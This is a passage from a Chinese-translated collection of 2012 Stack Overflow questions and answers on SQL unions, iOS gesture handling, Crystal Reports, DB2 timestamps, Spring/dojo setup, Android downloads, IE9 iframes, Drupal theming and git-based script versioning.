3|Kyle  |Child |11-12-2010 
```

我尝试使用外连接和连接，使用临时表来组合和查询结果我似乎没有找到一种正确的方法。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:42:21.897

只需使用`UNION`以组合两个表中的行。列名必须相同，这就是我`alias`在`child's`表中使用的原因。

```
SELECT ISN, ParentName AS PersonName, 'Parent' AS `Status`, JoinedDate
FROM parentTable
UNION
SELECT ISN, ChildName AS PersonName, 'Child' AS `Status`, JoinDate AS JoinedDate
FROM childTable
ORDER BY ISN, `Status` DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:43:22.810

使用“联合”

```
select ISN, ParentName, 'Parent' as 'Filiation', JoinedDate from ParentTable

UNION

select ISN, ChildName, 'Child' as 'Filiation', JoinDate from ChildTable 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:43:37.367

使用以下查询：

```
SELECT ISN, ParentName, 'Parent', JoinedDate
UNION SELECT ISN, ChildName, 'Child', JoinDate` 
```

但最好将有关父母和孩子的数据保存在具有附加字段类型的单个表中（例如：0 - 父母，1 - 孩子）。

# iphone - 如何从 UITableView iphone 获取 UITableView IndexPath？

> ID：11935440
> 
> 赞同：2
> 
> 时间：2012-08-13T13:38:37.917
> 
> 标签：iphone, ios, uitableview, didselectrowatindexpath, uitapgesturerecognizer

在我的 iPhone 应用程序中，我有一个消息屏幕。我已经添加`UITapGestureRecognizer`了，`UIViewController`并且我`UITableview`在屏幕上也有一个。我想选择，`UITableViewCell`但我不能选择，`UITableView`因为`UITapGestureRecognizer`。当我触摸屏幕时，只调用点击手势动作但不调用`UITableView`委托。`didSelectRowAtIndexPath:`谁能帮我处理轻击手势和`UITableView:didSelectRowAtIndexPath:`. 提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T15:18:09.403

虽然我更喜欢 Matt Meyer 的建议或我使用自定义手势识别器的其他建议，但不涉及自定义手势识别器的另一种解决方案是让您的点击手势识别器识别您是否点击了表格视图中的单元格，如果是，则手动调用`didSelectRowAtIndexPath`，例如：

```
- (void)handleTap:(UITapGestureRecognizer *)sender
{
    CGPoint location = [sender locationInView:self.view];

    if (CGRectContainsPoint([self.view convertRect:self.tableView.frame fromView:self.tableView.superview], location))
    {
        CGPoint locationInTableview = [self.tableView convertPoint:location fromView:self.view];
        NSIndexPath *indexPath = [self.tableView indexPathForRowAtPoint:locationInTableview];
        if (indexPath)
            [self tableView:self.tableView didSelectRowAtIndexPath:indexPath];

        return;
    }

    // otherwise proceed with the rest of your tap handling logic
} 
```

这是次优的，因为如果您使用 tableview 做任何复杂的事情（例如，在单元格编辑、自定义控件等中），您会失去这种行为，但如果您只是想接收`didSelectRowAtIndexPath`，那么这可能会完成这项工作。其他两种方法（单独的视图或自定义手势识别器）让您保留完整的 tableview 功能，但如果您只需要简单的东西并且不需要 tableview 的其余内置功能，这可能会起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:46:28.503

您可以使用 TagGesture 委托：

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch
{
    if ([touch.view isDescendantOfView:yourTableView]) {
        return NO;
    }

    return YES;
} 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:59:55.843

一种更简单的方法是拥有两个视图：一个包含您希望点击手势打开的视图，另一个包含表格视图。您可以将 UITapGestureRecognizer 附加到您希望它处理的视图上，然后它就不会阻塞您的 UITableView。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:12:57.917

假设您希望点击手势在除了 tableview 之外的任何地方都可以工作，您可以对点击手势识别器进行子类化，创建一个识别器，该识别器将忽略数组中包含的任何子视图`excludedViews`，从而阻止它们生成成功的手势（从而将其传递给`didSelectRowAtIndexPath`或任何）：

```
#import <UIKit/UIGestureRecognizerSubclass.h>

@interface MyTapGestureRecognizer : UITapGestureRecognizer
@property (nonatomic, strong) NSMutableArray *excludedViews;
@end

@implementation MyTapGestureRecognizer

@synthesize excludedViews = _excludedViews;

- (id)initWithTarget:(id)target action:(SEL)action
{
    self = [super initWithTarget:target action:action];
    if (self)
    {
        _excludedViews = [[NSMutableArray alloc] init];
    }

    return self;
}

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    [super touchesBegan:touches withEvent:event];

    CGPoint location = [[touches anyObject] locationInView:self.view];

    for (UIView *excludedView in self.excludedViews)
    {
        CGRect frame = [self.view convertRect:excludedView.frame fromView:excludedView.superview];

        if (CGRectContainsPoint(frame, location))
            self.state = UIGestureRecognizerStateFailed;
    }
}

@end 
```

然后，当您想使用它时，只需指定要排除的控件：

```
MyTapGestureRecognizer *tap = [[MyTapGestureRecognizer alloc] initWithTarget:self action:@selector(handleTap:)];
[tap.excludedViews addObject:self.tableView];
[self.view addGestureRecognizer:tap]; 
```

# function - Crystal Reports 自定义 IsNull 函数

> ID：11935443
> 
> 赞同：5
> 
> 时间：2012-08-13T13:38:46.143
> 
> 标签：function, crystal-reports, crystal-reports-2008

我正在尝试在 Crystal Reports 中创建自定义 IsNull 函数；该函数的行为方式必须与 MS SQL Server 中的 IsNull 函数相同。我想指定一个字段，如果该字段为空，那么它必须返回一个我指定的值。

```
IsNull({myField},0) or
IsNull({myField},'Hello World') 
```

我遇到过我必须为数字字段创建一个单独的函数，为文本字段创建一个单独的函数。我还发现 Crystal 不允许在自定义函数中使用标准函数，例如`ISNULL`Function：

```
Function(NumberVar param, Numbervar setter)
IF ISNULL(param) THEN setter ELSE param 
```

和

```
Function(StringVar param, StringVar setter)
IF param = NULL THEN setter ELSE param 
```

有谁知道我如何在 Crystal 中创建这样的函数并为`ISNULL`自定义函数内部解决问题？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-13T14:26:18.437

您不能将空值传递给自定义函数，因此`isnull`在其中使用水晶的函数是没有意义的。唯一的选择是写成...

```
if isnull({myField}) then 0 else {myField} 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-04-21T20:56:59.297

我发现了这个问题，在公式编辑器中，标题中有一个下拉菜单，指示：

*   空值例外
*   空值的默认值

选择第二个（空值的默认值）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T14:21:03.457

我遇到了同样的行为，但我还没有看到有据可查的原因。

我建议您使用 SQL 表达式：

```
//{%myField}
(
  ISNULL({myField},'Hello World') 
) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-01-30T00:05:53.330

这对我有用：

```
if  (isnull({dbvalue}) or ({dbvalue} ='')) then 
       "Display the required text"
else
       {dbvalue} 
```

# timestamp - 在 DB2 中转换自 1980 年以来的秒数

> ID：11935448
> 
> 赞同：0
> 
> 时间：2012-08-13T13:39:04.810
> 
> 标签：timestamp, db2

我正在寻找一种使用 SQL、DB2 函数、列数据类型将自 1980 年以来的秒数转换为 DB2 TIMESTAMP 的方法——不管怎样。那可能吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:06:48.047

试试这个：

```
SELECT TIMESTAMP ('1980-01-01-00.00.00.000000') + X SECOND
    FROM SYSIBM.SYSDUMMY1; 

SELECT TIMESTAMP ('1980-01-01-00.00.00.000000') + 6000000 SECOND 
    FROM SYSIBM.SYSDUMMY1;
1980-03-10 10:40:00 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:04:09.517

您需要多少精度？这应该将您的值转换为日期（假设您的日期格式为 sec_value）：

```
date(sec_value / 86400 + days('1980-01-01')) 
```

如果您需要超出此范围的精度，那么通过自己的数学运算来获得小时和秒就不会那么难了。快速搜索没有发现任何内置功能可以做到这一点。

# spring - 集成dojo和Spring JS的问题

> ID：11935454
> 
> 赞同：0
> 
> 时间：2012-08-13T13:39:20.517
> 
> 标签：spring, spring-mvc, dojo, spring-js

我收到 JS 错误并且 dojo 没有得到反映

在与 dojo 一起开发 spring MVC 应用程序时，我遇到了上述问题。我遵循的配置步骤如下。在 web.xml 中，实现了以下代码以访问 springframework.js Jar 中存在的 JS 文件/资源​​以及其他应用程序配置

```
 <servlet>
       <servlet-name>Resource Servlet</servlet-name>
       <servlet-class>org.springframework.js.resource.ResourceServlet</servlet-class>
    </servlet>
    <servlet-mapping>
       <servlet-name>Resource Servlet</servlet-name>
       <url-pattern>/resources/*</url-pattern>
    </servlet-mapping> 
```

在 JSP 中，添加了以下代码片段，用于从 JAR(springframework.js) 导入 dojo 库并支持 spring JS 文件

```
 <style type="text/css">
    @import url 
    ("${pageContext.request.contextPath}/resources/dijit/themes/tundra/tundra.css");
    </style>
    <script type="text/javascript" src="<c:url    
            value="/resources/dojo/dojo.js" />"       
            djconfig="parseOnLoad: true"> </script>
    <script type="text/javascript" src="<c:url    
             value="/resources/spring/Spring.js" />">      
    </script>
    <script type="text/javascript" src="<c:url value="/resources/spring/Spring-  
                Dojo.js" />"> </script>
     <script type="text/javascript">dojo.require("dojo.parser");</script> 
```

我的疑问是 JSP 中导入的 JS 文件是否必须存在/显式下载并保存在 webcontent 下的资源目录中，或者这些文件是否存在于 springframework.js JAR 文件中？它会被 web.xml 中配置的 ResourceServlet 动态引用吗？

我尝试了这两个选项，但我仍然收到 JS 错误，因为 Object Spring 未定义。我正在使用下面的**弹簧装饰**，这就是发生JS 错误（**Spring 未定义）的地方（** **Spring.addDecoration**）。

 **```
 <script type="text/javascript">
        Spring.addDecoration(new Spring.ElementDecoration({
    elementId: "userFname",
    widgetType: "dijit.form.ValidationTextBox"
    }));
    </script> 
```

请帮我解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T14:19:12.037

缺少包含 dojo 功能（dojo.js、Spring-Dojo.js 和主题）的 org.springframework.js.resources jar 文件。导入 org.springframework.js 使资源 servlet 可用。所以这两个罐子都是必需的，问题已解决**

# android - 第一次单击时如何在图像视图上禁用单击事件

> ID：11935456
> 
> 赞同：0
> 
> 时间：2012-08-13T13:39:22.547
> 
> 标签：android, android-imageview

我有包含图像的网格。点击图片，开始下载书籍。如果下载正在进行中并且如果我单击该图像，则只有下载开始。因此，生成的文件已损坏。下载任务已放在image的onClick事件上。我试图让第一个图像可点击为假，然后 setEnable 为假。但两种方式都不适合我。即使下载正在进行中，图像点击也能正常工作。请指导。有关详细信息，这是我的代码：

```
 public class GridViewAdapter extends BaseAdapter {
    ImageView imageView;
    private Context context;
    private int item;
    private LayoutInflater layoutInflater;

    GridViewAdapter(Context c, int griditem) {
        this.context = c;
        this.item = griditem;
        this.layoutInflater = (LayoutInflater) c
                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    @Override
    public int getCount() {

        return bank.size();
    }

    @Override
    public Object getItem(int position) {
      return bank.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public View getView(final int position, View convertView, ViewGroup arg2) {
        View grid;

        Display display = ((WindowManager) context
                .getSystemService(WINDOW_SERVICE)).getDefaultDisplay();

        int orientation = display.getOrientation();

        if (convertView == null) {
            grid = new View(context);
            grid = layoutInflater.inflate(item, null);
        } else {
            grid = (View) convertView;
        }

        final TextView title = (TextView) grid.findViewById(R.id.mgntitle);
        title.setText(bank.get(position).getTitle());
        imageView = (ImageView) grid.findViewById(R.id.thumbnail);
        imageView.setImageResource(R.drawable.icon);
        final ProgressBar progress = (ProgressBar) grid
                .findViewById(R.id.progress);
        final ImageView downloadmark = (ImageView) grid
                .findViewById(R.id.downloadmark);
        String pdfLink = bank.get(position).getPdfLink();
        String filename = pdfLink.substring(pdfLink.lastIndexOf("/") + 1);

        final File targetDir = new File(fileLocation + filename);

        if(targetDir.exists()){
            downloadmark.setVisibility(View.VISIBLE);

        }
        imageView.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                if (!targetDir.exists()) {
                    if (isInternetConnected()) {
                        map.put(bank.get(position).getTitle(), progress);
                        new DownloadPdfFile(GridDisplayActivity.this, bank
                                .get(position).getPdfLink(), progress,
                                downloadmark, imageView).execute();
                    } else {
                        setAlertBox("You are not connected to Internet. Please switch your connection ON to be able to Downlaod Bespoken Magazines");
                    }
                } else {

                     Toast.makeText(context, "File exists",
                            Toast.LENGTH_LONG).show();

                    // Book opening intent has to be fried here
                }
            }

        });

        imageView.setImageBitmap(BitmapFactory.decodeByteArray(
                bank.get(position).getCoverPages(), 0, bank.get(position)
                        .getCoverPages().length));

        if (!getPrefName(filename).equalsIgnoreCase("NA")) {
            if (new File(fileLocation + filename).exists()) {
                // tag.setImageResource(R.drawable.bookmark);
                 downloadmark.setVisibility(View.VISIBLE);

            } else {
                SharedPreferences pref = getApplicationContext()
                        .getSharedPreferences("BESPOKEN_PREF",
                                MODE_WORLD_WRITEABLE);
                SharedPreferences.Editor editor = pref.edit();
                editor.putString(filename, "NA");
                editor.commit();

            }
        }

        if (new File(fileLocation + filename).exists()) {
            if (!getPrefName(filename).equalsIgnoreCase("NA")) {
                // tag.setImageResource(R.drawable.bookmark);
            //  downloadmark.setVisibility(View.VISIBLE);

            } else {

            }

        }

        return grid;

    }
}

private String getPrefName(String name) {
    SharedPreferences pref = this.getSharedPreferences("BESPOKEN_PREF",
            MODE_WORLD_WRITEABLE);
    return pref.getString(name, "NA");
}

private void saveBookName(String title) {
    SharedPreferences pref = this.getSharedPreferences("BESPOKEN_PREF",
            MODE_WORLD_WRITEABLE);
    SharedPreferences.Editor editor = pref.edit();
    editor.putString(title, title);
    editor.commit();
}

private boolean isInternetConnected() {
    connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
    mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
    mMobile = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
    return mWifi.isConnected() || mMobile.isConnected();
}

private class DownloadPdfFile extends AsyncTask<Void, Integer, Void> {

    private int progressupdate;
    String link;
    ProgressBar progress;
    ImageView cover;
    String file;
    ImageView dwnloadmark;

    public DownloadPdfFile(GridDisplayActivity activity, String link,
            ProgressBar progressbar, ImageView dwnmrk, ImageView imageView) {
        imageView.setEnabled(false);
        progress = progressbar;
        this.link = link;
        this.cover = imageView;
        this.dwnloadmark = dwnmrk;

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        cover.setEnabled(false);
        progress.setVisibility(View.VISIBLE);
    }

    @Override
    protected Void doInBackground(Void... params) {

        file = link.substring(link.lastIndexOf("/") + 1);
        InputStream is = null;
        long startTime = 0;
        int count;
        // DownloadFromUrl(link, fileLocation + file,progress);
        try {

            URL url = new URL(link);
            File dir = new File(fileLocation);
            if (dir.exists()) {

            } else {
                Log.i("",
                        "---------targetDir not .exists()----------------4");
                dir.mkdirs();
            }
            URLConnection conexion = url.openConnection();
            conexion.connect();

            int lenghtOfFile = conexion.getContentLength();
            Log.d("ANDRO_ASYNC", "Lenght of file: " + lenghtOfFile);

            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream(fileLocation + file);

            byte data[] = new byte[1024];

            long total = 0;

            while ((count = input.read(data)) != -1) {
                total += count;

                publishProgress((int) ((total * 100) / lenghtOfFile));

                output.write(data, 0, count);
            }

            output.flush();
            output.close();
            input.close();
        } catch (IOException e) {
            e.printStackTrace();

        }
        Log.d("ImageManager",
                "download ready in"
                        + ((System.currentTimeMillis() - startTime) / 1000)
                        + " sec");
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... prog) {
        progressupdate = prog[0];
        progress.setProgress(progressupdate);

    }

    @Override
    protected void onPostExecute(Void result) {
        super.onPostExecute(result);
        dwnloadmark.setVisibility(View.VISIBLE);
        // tag.setImageResource(R.drawable.bookmark);
        progress.setVisibility(View.INVISIBLE);
        saveBookName(file);
        cover.setEnabled(true);
    }

}

class DoBackgroundTask extends CustomAsyncTask<Void, Integer, Void> {
    private static final String TAG = "DoBackgroundTask";

    private int progressupdate;
    String link;
    private ProgressBar progress;
    ImageView dwnloadmark;
    ImageView cover;
    String file;
    GridDisplayActivity activity;

    public DoBackgroundTask(GridDisplayActivity activity, String link,
            ProgressBar progressbar, ImageView dwnmrk, ImageView img) {
        super(activity);
        img.setEnabled(false);
        this.activity = activity;
        progress = progressbar;
        this.link = link;
        this.dwnloadmark = dwnmrk;
        this.cover = img;

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        cover.setEnabled(false);
        progress.setVisibility(View.VISIBLE);
    }

    @Override
    protected void onActivityDetached() {
        if (progress != null) {
             //progress.setActivated(false);
            // progress = null;
        }
    }

    @Override
    protected void onActivityAttached() {

        //progress.setActivated(true);
        progress.setVisibility(View.VISIBLE);
        progress.setProgress(progressupdate);
        // showProgressDialog();
    }

    @Override
    protected Void doInBackground(Void... params) {

        file = link.substring(link.lastIndexOf("/") + 1);
        InputStream is = null;
        long startTime = 0;
        int count;
        // DownloadFromUrl(link, fileLocation + file,progress);
        try {

            URL url = new URL(link);
            File dir = new File(fileLocation);
            if (dir.exists()) {

            } else {

                dir.mkdirs();
            }
            URLConnection conexion = url.openConnection();
            conexion.connect();

            int lenghtOfFile = conexion.getContentLength();
            Log.d("ANDRO_ASYNC", "Lenght of file: " + lenghtOfFile);

            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream(fileLocation + file);

            byte data[] = new byte[1024];

            long total = 0;

            while ((count = input.read(data)) != -1) {
                total += count;

                publishProgress((int) ((total * 100) / lenghtOfFile));

                output.write(data, 0, count);
            }

            output.flush();
            output.close();
            input.close();
        } catch (IOException e) {
            e.printStackTrace();

        }
        Log.d("ImageManager",
                "download ready in"
                        + ((System.currentTimeMillis() - startTime) / 1000)
                        + " sec");
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... prog) {

        progressupdate = prog[0];

        if (mActivity != null) {
            progress.setProgress(progressupdate);
        } else {
            Log.d(TAG, "Progress updated while no Activity was attached.");
        }
    }

    @Override
    protected void onPostExecute(Void result) {
        super.onPostExecute(result);
        dwnloadmark.setVisibility(View.VISIBLE);    
        cover.setEnabled(true);
        saveBookName(file);

        if (mActivity != null) {
            progress.setVisibility(View.INVISIBLE);
            Toast.makeText(mActivity, "AsyncTask finished",
                    Toast.LENGTH_LONG).show();
        } else {

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T13:47:12.373

```
public class GridViewAdapter extends BaseAdapter {

    private boolean _buttonPressed = false;

    .....

    imageView.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            if(_buttonPressed){
               return;
            }
            _buttonPressed = true;
            .........

    ..... 

    private class DownloadPdfFile extends AsyncTask<....> {
          .....
          @Override
          protected void onPostExecute(....) {
              _buttonPressed = false;    
          } 
          ..... 
    }
} 
```

# javascript - IE9 错误？由于 URL 敏感性导致 iframe 行为异常

> ID：11935458
> 
> 赞同：0
> 
> 时间：2012-08-13T13:39:27.127
> 
> 标签：javascript, html, internet-explorer, iframe, internet-explorer-9

我在我的 IE 9 (9.0.8112.16421) 上看到了一种奇怪的行为，即`iframe`使用它更改通过 javascript的位置时`iframe.setAttribute( 'src', 'http://..' )`会在 javascript 控制台中引发错误。

起初它似乎与大小写有关，但后来令人困惑的是，我尝试了一些带有一些大写字符的其他 URL，它起作用了。

如果我使用下面的 javascript：

```
frame.setAttribute( 'src', 'http://tidevwls03:7161/OpenTwinsApp/app/index.jsf' ); 
```

或者..

```
frame.src = 'http://tidevwls03:7161/OpenTwinsApp/app/index.jsf'; 
```

甚至是硬编码的 HTML ..

```
<iframe src="http://tidevwls03:7161/OpenTwinsApp/app/index.jsf"/> 
```

然后我收到以下错误。

```
SCRIPT5022: DOM Exception: INVALID_CHARACTER_ERR (5) 
core.js, line 1 character 192310 
```

奇怪的是，如果我将 OpenTwinsApp 部分更改为 opentwinsapp、myapp 或 MyApp，它会按预期工作。该 URL`http://www.google.com:80/OpenTwinsApp/app/index.jsf`似乎也有效。

作为一种解决方法；我正在考虑为 javascript 转发引入一个新页面，因为提供 URL 作为参数似乎很好。这并不理想，但至少它会起作用。

我可以使用其他解决方法吗？

这似乎是 IE 9 中的错误？像往常一样，Chrome 完美无缺。

**更新：**

*   我尝试仅使用 HTML 设置 iframe src，但我也收到了相同的错误消息。
*   我尝试引入一个转发页面，该页面只会执行 a `document.location.href = 'http://tidevwls03:7161/OpenTwinsApp/app/index.jsf';`，但这也无法加载并出现相同的错误。
*   我尝试使用缩短的 URL`http://goo.gl/Sy4pk`来访问该页面，它导致了同样的错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T15:38:56.943

问题似乎是因为 IE9 标准模式。我更改为 Quirks 模式并加载 IFrame 内容。在我的例子中，我想更改为 IE8 标准模式，以便工具提示也适用于输入元素和 iframe。

以下链接特别有助于帮助我了解使浏览器进入 IE 8 标准模式需要做什么 -[使用 Doctype 激活浏览器模式](http://hsivonen.iki.fi/doctype/)

最后，我添加了一个 doctype，`<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">`然后添加`<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">`以使 IE 浏览器模拟 IE 8。

# drupal - 为什么drupal中的模块和.install文件没有关闭php标签

> ID：11935459
> 
> 赞同：1
> 
> 时间：2012-08-13T13:39:26.977
> 
> 标签：drupal, drupal-6, drupal-modules

如果您在 drupal 中创建自定义模块，则无需在 drupal 中结束 .module 和 .install 文件中的 php 标签。我们不关闭 php 标签的原因是什么！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T13:48:55.700

来自[drupal.org/coding-standards](http://drupal.org/coding-standards)：

请注意，从 Drupal 4.7 开始，代码文件末尾的 ?> 被有意省略了。这包括模块和包含文件。其原因可归纳为：

*   删除它消除了文件末尾不需要的空格的可能性，这可能导致“标头已发送”错误、XHTML/XML 验证问题和其他问题。
*   文件末尾的结束分隔符是可选的。
*   PHP.net 本身从其文件的末尾删除了结束分隔符（例如：prepend.inc），因此这可以被视为“最佳实践”。

# html - 为什么我的字体没有出现在某些计算机上？但是我可以在不同的网站上查看我没有安装的其他字体？

> ID：11935474
> 
> 赞同：1
> 
> 时间：2012-08-13T13:39:49.093
> 
> 标签：html, fonts

不知道这是否是正确的地方，但我对 html 很陌生，已经制作了一个完整的网站并上传到网络服务器。

但是我尝试在另一台设备上访问该网站，字体显示不同，但是当我进入一个具有不同字体的网站时，它在他们的网站上显示良好。

难道我做错了什么？

干杯

亚当

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:44:52.000

因为计算机没有那种字体，而且你没有包含要下载的字体，只是一个关于使用哪个字体的说明。

CSS`@fontface`指令允许您将浏览器定向到带有字体的文件。

一种更简单、更轻松的方法是建议备份。例如，而不是：

```
font-family: arial; 
```

你可以使用：

```
font-family: arial, verdana, sans-serif; 
```

第一个将尝试使用 Arial，如果它不可用，将只使用浏览器的默认字体（例如，可能是像 Times 这样的衬线字体）。

第二个将尝试使用 Arial。如果不可用，它将尝试使用 Verdana。如果这不可用，它将尝试使用浏览器的默认无衬线字体，该字体至少应该比衬线字体更接近。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:47:29.767

这是一个关于如何在网站上创建自定义字体的精彩教程。

[http://blog.themeforest.net/tutorials/how-to-achieve-cross-browser-font-face-support/](http://blog.themeforest.net/tutorials/how-to-achieve-cross-browser-font-face-support/)

它还将解释在某些浏览器上兼容哪些类型的字体

# drupal-7 - 如何在 Drupal 中为菜单块设置主题？

> ID：11935477
> 
> 赞同：1
> 
> 时间：2012-08-13T13:39:54.147
> 
> 标签：drupal-7, drupal-theming, drupal-navigation

这确实应该是一个基本问题，但经过数小时的搜索，我根本没有得到它。问题是，如何在 Drupal 7 中为菜单块设置主题？

我根据主菜单创建了三个不同的块。现在我想：

1.  为所有三个块创建唯一的 HTML，这意味着修改周围的包装器和构建菜单的`<ul>`和`<li>`。我想设置特殊课程并删除所有 Drupal 添加的东西

2.  将不同的类附加到每个块内的不同级别。其中一个块将显示两级菜单，即显示一个子菜单。我想为子菜单设置一个特殊的类...

这似乎是不可能的...... :(

提前感谢您的帮助！！！！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-15T03:12:39.167

主题化是一种棘手的野兽，通常会根据您需要做的事情而变化很大。即使您的描述非常详细，我仍然可以说“这取决于”，但这里有几个步骤可以帮助您找到正确的方向。

**第 1 步：**按照 Caffeine Addict 的建议使用块 tpl.php。如果您不确定如何命名 .tpl.php，我建议您使用[Theme Developer](http://drupal.org/project/devel_themer)模块。它有问题，但您可以使用它来选择特定元素并让它告诉您命名 .tpl.php 文件的建议。

![概述来自开发主题的候选模板文件](../Images/3dbe00379885b7a7fdd7ace7c20ffeb3.png)

**第 2 步：**使用 template.php 中的主题/预处理函数来修改预定义的变量和标记。请务必查看 api.drupal.org 上的[theme_menu_tree](http://api.drupal.org/api/drupal/includes!menu.inc/function/theme_menu_tree/7)和[template_preprocess_menu_tree](http://api.drupal.org/api/drupal/includes!menu.inc/function/template_preprocess_menu_tree/7)函数以获取起点。如果您使用的是[devel 模块](http://drupal.org/project/devel)， `dpm($variables);`请在每个模块中使用以从一开始就查看您必须使用的内容。

我希望这会有所帮助！我同意咖啡因瘾君子的说法，他说[超级鱼](http://drupal.org/project/superfish/)可能是一种替代品。您还应该查看[菜单块](http://drupal.org/project/menu_block/)模块，以将条件子部分分解为它们自己的块。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-06T07:19:24.980

除了 davidneedham 所说的，要更改 Drupal 添加到菜单 HTML 标记的内容，您可以覆盖它们。这里添加了类：

```
<ul class="expanded">
  <li class="firstleaf">...<li>
  ...
</ul> 
```

我没有找到删除此类的方法，但是您可以在`block--system--main_menu.tpl.php`文件中覆盖它们，如下所示：

```
li.expanded,
li.collapsed,
li.leaf {
  padding: 0 0 0 0;
  margin: 0;
}
ul.menu li {
  margin: 0 0 0 0;
} 
```

然后打印您的菜单内容：

```
<?php echo $content; ?> 
```

我是 Drupal 的新手，希望我的帖子可以帮助到你！:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:47:58.397

我建议从安装 Zen 主题开始，然后按照主题内的说明设置启动子主题。这包含了在 drupal 中学习主题以及如何添加自己的样式表等所需的所有信息。

这将允许您开始编辑菜单块的模板并设置您自己的 html 包装器和类。

为了在块上设置额外的类，我会使用这个模块： [http ://drupal.org/project/block_class](http://drupal.org/project/block_class)

然后只需编辑该块，您将看到一个额外的部分，用于向该块添加其他类。

# git - 如何维护受 git 源代码控制的 bash 脚本的版本号？

> ID：11935480
> 
> 赞同：18
> 
> 时间：2012-08-13T13:40:02.277
> 
> 标签：git, bash, version

我刚刚完成了一个更复杂的 bash 脚本的第一个工作版本，我正在思考如何维护脚本版本。

为什么我需要这个？遵循[命令行接口的 GNU 编码标准，](http://www.gnu.org/prep/standards/html_node/Command_002dLine-Interfaces.html)我添加了一个版本选项，它在许可证和版权标题中显示当前版本。

不过，我不知道如何保持版本“最新”。

到目前为止，我的想法是使用 git 标签作为专业 | 未成年人 | 补丁发布，并以某种方式替换脚本中包含的变量。

所以，如果我有一个名为 的标签`1.1.0`，那么

```
$ myscript --version 
```

应该输出如下内容：

```
myscript 1.1.0 
```

该脚本为此包含一个 shell 变量：

```
version=1.1.0 
```

不过，我现在不知道如何使版本与最新标签保持同步？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-13T14:41:49.723

据我所知，你想要的是不可能的。为了将版本号提交到版本控制软件中，您必须编辑版本号，提交，然后标记；不是相反。但是，您可以简化流程。

我们可以通过编写一个 post-commit 钩子来做到这一点，该钩子将读取您的脚本的版本号，如果它与上次相比发生了变化，则写出一个新标签。为此，`.git/hooks`从您的项目目录 cd 进入，创建一个名为`post-commit`（或 move `post-commit.sample`）的文件并使其可执行。然后对其进行编辑，使其看起来像这样：

```
#!/bin/bash

NEWEST_TAG=$(git describe --abbrev=0 --tags)

SCRIPT_VERSION=$(grep "^version=" myscript | awk -F= '{print $2}')

if [ x$NEWEST_TAG != x$SCRIPT_VERSION ]; then
    git tag -a $SCRIPT_VERSION -m "version $SCRIPT_VERSION"
fi 
```

下次您修改脚本的版本号并提交更改时，您会看到一个新标签添加到您的最新提交中。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-15T17:13:45.467

先前给出的基于钩子的答案将版本字符串的同步与`git commit`;紧密结合在一起。但是听起来您希望它以相反的方式工作，即版本是从手动创建的`git tag`元数据中提取的。事实证明，实际上这几乎就是[`git`源代码](https://github.com/git/git)本身使用的方法，所以让我们通过检查它的方法来了解如何采用类似的方法：

*   它有一个[GIT-VERSION-GEN](https://github.com/git/git/blob/master/GIT-VERSION-GEN) shell 脚本，它试图智能地确定当前版本。本质上，它尝试通过 提取版本字符串`git describe`，但如果这不起作用，则回退到硬编码的默认值。版本被写入`GIT-VERSION-FILE`源代码树的顶部。
*   [`Makefile`](https://github.com/git/git/blob/master/Makefile)调用此脚本并生成生成的`include`文件：

    ```
    GIT-VERSION-FILE: FORCE
            @$(SHELL_PATH) ./GIT-VERSION-GEN
    -include GIT-VERSION-FILE 
    ```

    现在该版本可供`Makefile`via的其余部分访问`$(GIT_VERSION)`。

*   然后各种 Make 规则使用它对需要硬编码版本字符串的任何文件执行替换，例如各种 Perl 脚本：

    ```
    $(patsubst %.perl,%,$(SCRIPT_PERL)): % : %.perl GIT-VERSION-FILE
            $(QUIET_GEN)$(RM) $@ $@+ && \
            INSTLIBDIR=`MAKEFLAGS= $(MAKE) -C perl -s --no-print-directory instlibdir` && \
            sed -e '1{' \
                [... snipped other substitutions ...]
